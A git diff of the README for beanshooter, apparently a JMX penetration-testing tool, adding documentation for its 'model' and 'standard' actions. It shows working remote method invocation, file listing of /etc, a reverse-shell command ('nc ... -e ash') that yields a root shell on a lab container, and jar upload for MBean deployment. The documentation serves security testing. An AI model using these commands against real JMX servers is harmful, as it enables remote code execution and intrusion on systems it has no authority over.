@@ -8,7 +8,7 @@
 ![](https://github.com/qtc-de/beanshooter/workflows/develop%20maven%20CI/badge.svg?branch=develop)
 ![](https://img.shields.io/badge/java-8%2b-blue)
 [![](https://img.shields.io/badge/build%20system-maven-blue)](https://maven.apache.org/)
-[![](https://img.shields.io/badge/version-4.0.0-blue)](https://github.com/qtc-de/beanshooter/releases)
+[![](https://img.shields.io/badge/version-4.1.0-blue)](https://github.com/qtc-de/beanshooter/releases)
 [![](https://img.shields.io/badge/license-GPL%20v3.0-blue)](https://github.com/qtc-de/beanshooter/blob/master/LICENSE)
 
 
@@ -61,8 +61,10 @@ autocompletion.
     - [invoke](#invoke)
     - [jolokia](#jolokia)
     - [list](#list)
+    - [model](#model)
     - [serial](#serial)
     - [stager](#stager)
+    - [standard](#standard)
     - [undeploy](#undeploy)
   + [MBean Operations](#mbean-operations)
     - [generic](#generic-mbean-operations)
@@ -449,6 +451,153 @@ The `list` action prints a list of all registered *MBeans* on the remote *JMX* s
 [...]
 ```
 
+#### Model
+
+The `model` action is one of the most powerful *beanshooter* operations and implements a technique
+identified by [Markus Wulftange](https://twitter.com/mwulftange) that allows you to invoke arbitrary
+*public* and *static* Java methods. Moreover, *public* object methods can also be invoked on a user
+created object instance. The only requirements are that the utilized method arguments and the provided
+object instance (for *non static* methods) are serializable.
+
+The following listing shows an example usage, where an `File` object is provided as object instance
+and the `String[] list()` operation is invoked on it:
+
+```console
+[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
+[+] Deploying RequiredModelMBean supporting methods from java.io.File
+[+]
+[+] 	Deplyoing MBean: RequiredModelMBean
+[+] 	MBean with object name de.qtc.beanshooter:version=1 was successfully deployed.
+[+]
+[+] 	Available Methods:
+[+] 	  - java.lang.String toString()
+[+] 	  - int hashCode()
+[+] 	  - [Ljava.lang.String; list()
+[...]
+[+] 	  - void setManagedResource(java.lang.Object, java.lang.String)
+[+]
+[+] 	Setting managed resource to: new java.io.File("/")
+[+] 	Managed resource was set successfully.
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
+root
+var
+opt
+srv
+bin
+mnt
+dev
+proc
+etc
+usr
+lib
+tmp
+home
+run
+media
+sbin
+sys
+.dockerenv
+```
+
+The `setManagedResource` method is always available and can be used to change the object instance to operate on:
+
+```console
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'setManagedResource(Object a, String b)' 'new java.io.File("/etc")' objectReference
+[+] Call was successful.
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
+passwd
+shells
+opt
+modules
+mtab
+issue
+inittab
+hosts
+...
+```
+
+When invoking *static* methods, an object instance is also required. However, the actual class of the object instance does
+not matter. E.g. if you want to invoke `getProperties()` from `java.lang.System`, you could also use a simple `String`
+as object instance. Only the specified class name matters in this case:
+
+```console
+[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.lang.System '"does not matter"'
+[+] Deploying RequiredModelMBean supporting methods from java.lang.System
+[+]
+[+] 	Deplyoing MBean: RequiredModelMBean
+[+] 	MBean with object name de.qtc.beanshooter:version=1 was successfully deployed.
+[+]
+[+] 	Available Methods:
+[+] 	  - void runFinalization()
+[+] 	  - java.lang.String setProperty(java.lang.String, java.lang.String)
+[+] 	  - java.lang.String getProperty(java.lang.String)
+[+] 	  - java.lang.String getProperty(java.lang.String, java.lang.String)
+[+] 	  - long currentTimeMillis()
+[+] 	  - long nanoTime()
+[+] 	  - java.lang.SecurityManager getSecurityManager()
+[+] 	  - void loadLibrary(java.lang.String)
+[+] 	  - java.lang.String mapLibraryName(java.lang.String)
+[+] 	  - void load(java.lang.String)
+[+] 	  - java.lang.String lineSeparator()
+[+] 	  - java.io.Console console()
+[+] 	  - java.nio.channels.Channel inheritedChannel()
+[+] 	  - java.util.Properties getProperties()
+[+] 	  - void setProperties(java.util.Properties)
+[+] 	  - java.lang.String clearProperty(java.lang.String)
+[+] 	  - java.util.Map getenv()
+[+] 	  - java.lang.String getenv(java.lang.String)
+[+] 	  - void gc()
+[+] 	  - void wait()
+[+] 	  - java.lang.String toString()
+[+] 	  - int hashCode()
+[+] 	  - java.lang.Class getClass()
+[+] 	  - void notify()
+[+] 	  - void notifyAll()
+[+] 	  - void setManagedResource(java.lang.Object, java.lang.String)
+[+]
+[+] 	Setting managed resource to: "does not matter"
+[+] 	Managed resource was set successfully.
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'getProperties()'
+java.vm.info
+  --> mixed mode
+java.runtime.version
+  --> 11.0.18+10-alpine-r0
+sun.io.unicode.encoding
+  --> UnicodeLittle
+...
+```
+
+The `model` action uses reflection to determine available methods on the specified class. If you do not
+have the class locally available, you can still use it by specifying available methods via the `--signature`
+or `--signature-file` options. That being said, in order to get access to non default classes you need to
+provide an object instance that is also not a default class (not present in `rt.jar`). This is required, as
+the target class needs to be loaded by the same *ClassLoader* as the provided object instance. For *beanshooters*
+*example-server*, `javax.management.remote.message.VersionMessage` is suitable, as this class is present
+in `opendmk_jmxremote_optional_jar` which is present in the client as well as in the server. We can use
+this as an object instance to invoke methods on other custom classes, like `de.qtc.beanshooter.server.utils.Logger`:
+
+```console
+[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=0 de.qtc.beanshooter.server.utils.Logger 'new javax.management.remote.message.VersionMessage("test")' --signature 'String getIndent()'
+[+] Deploying RequiredModelMBean supporting user specified methods
+[+]
+[+] 	Deplyoing MBean: RequiredModelMBean
+[+] 	MBean with object name de.qtc.beanshooter:version=0 was successfully deployed.
+[+]
+[+] 	Available Methods:
+[+] 	  - String getIndent()
+[+] 	  - void setManagedResource(java.lang.Object, java.lang.String)
+[+]
+[+] 	Setting managed resource to: new javax.management.remote.message.VersionMessage("test")
+[+] 	Managed resource was set successfully.
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=0 --signature 'String getIndent()'
+EMPTY OUTPUT - Just an Indent ;)
+```
+
+If you want to know more about the technique that is implemented by the `model` action, I highly
+recommend this [blog post](https://codewhitesec.blogspot.com/2023/03/jmx-exploitation-revisited.html)
+by [CODE WHITE](https://twitter.com/codewhitesec) which explains it in great detail.
+
+
 #### Serial
 
 The `serial` action can be used to perform deserialization attacks on a *JMX* endpoint. By default, the action
@@ -519,6 +668,113 @@ the `--class-name`, `--object-name` and `--jar-file` options are required.
 [+] Requested resource: /93691b8bae4143f087f7a3123641b20d
 [+] Sending jar file with md5sum: 6568ffb2934cb978dbd141848b8b128a
 ```
+
+#### Standard
+
+The `standard` action deploys a *StandardMBean* that implements the `TemplateImpl` class to achieve
+different targets. This technique was identified by [Markus Wulftange](https://twitter.com/mwulftange)
+and *beanshooter* implements it to allow command execution, file upload and *TonkaBean* deployment.
+
+```console
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=3873612041699 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=3873612041699 from the MBeanServer.
+[+] 	MBean was successfully removed.
+...
+[qtc@devbox ~]$ nc -vlp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:40033.
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Command execution via the `standard` action is blind and you do not receive the output of your command.
+Moreover, by default your command is passed to `Runtime.exec(String str)`, which does not support special
+shell features. If you want to use shell features, use the `--exec-array` option and specify your command
+like this: `'sh -c echo "my cool command" > /tmp/test.txt'`. With `--exec-array`, *beanshooter* splits the
+specified command in three parts and passes them to `Runtime.exec(String[] arr)`. However, it is generally
+recommended to use the *TonkaBean* deployment for executing commands:
+
+```console
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 tonka
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=4121868972140 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4121868972140 from the MBeanServer.
+[+] 	MBean was successfully removed.
+[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
+[root@172.17.0.2 /]$ id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The huge advantage compared to the regular `tonka deploy` action is that deployment via the *StandardMBean*
+does not require an outbound network connection. If a direct deployment via `standard ... tonka` does not work,
+you may be able to upload the *TonkaBean* Jar file and load it via *MLet* and the `file://` protocol:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka export --stager-url file:///tmp/
+[+] Exporting MBean jar file: ./tonka-bean-4.0.0-jar-with-dependencies.jar
+[+] Exporting MLet HTML file to: ./index.html
+[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Archive:   tonka-bean-4.0.0-jar-with-dependencies.jar
+[+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+] 	Codebase:  file:/tmp/
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload tonka-bean-4.0.0-jar-with-dependencies.jar::/tmp/tonka-bean-4.0.0-jar-with-dependencies.jar
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=4825542879735 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4825542879735 from the MBeanServer.
+[+] 	MBean was successfully removed.
+[qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload index.html::/tmp/index.html
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=4836961801045 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4836961801045 from the MBeanServer.
+[+] 	MBean was successfully removed.
+[qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url file:///tmp/index.html
+[+] Starting MBean deployment.
+[+]
+[+] 	Deplyoing MBean: TonkaBean
+[+]
+[+] 		MBean class is not known by the server.
+[+] 		Starting MBean deployment.
+[+]
+[+] 			Deplyoing MBean: MLet
+[+] 			MBean with object name DefaultDomain:type=MLet was successfully deployed.
+[+]
+[+] 		Loading MBean from file:///tmp/index.html
+[+]
+[+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed.
+```
+
+If you want to know more about the technique that is implemented by the `standard` action, I highly
+recommend this [blog post](https://codewhitesec.blogspot.com/2023/03/jmx-exploitation-revisited.html)
+by [CODE WHITE](https://twitter.com/codewhitesec) which explains it in great detail.
 
 #### Undeploy
 
@@ -616,6 +872,9 @@ a builtin jar file is available):
 [+]
 [+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed
 ```
+
+From *beanshooter v4.1.0* on, it is also possible to deploy the *TonkaBean* via the [standard](#standard) action.
+Bean deployment via the `standard` action **does not** require outbound network connections from the target server.
 
 #### Generic Export
 
@@ -1274,8 +1533,8 @@ For each release, there is a *normal* and a *slim* version available. Both provi
 *beanshooter*, but only the *normal* version ships with [ysoserial](https://github.com/frohoff/ysoserial)
 included, resulting in a larger image size:
 
-* `docker pull ghcr.io/qtc-de/beanshooter/beanshooter:3.1.1` - `121MB`
-* `docker pull ghcr.io/qtc-de/beanshooter/beanshooter:3.1.1-slim` - `61.9MB`
+* `docker pull ghcr.io/qtc-de/beanshooter/beanshooter:4.1.0` - `124MB`
+* `docker pull ghcr.io/qtc-de/beanshooter/beanshooter:4.1.0-slim` - `64.8MB`
 
 You can also build the container on your own by running the following commands:
 
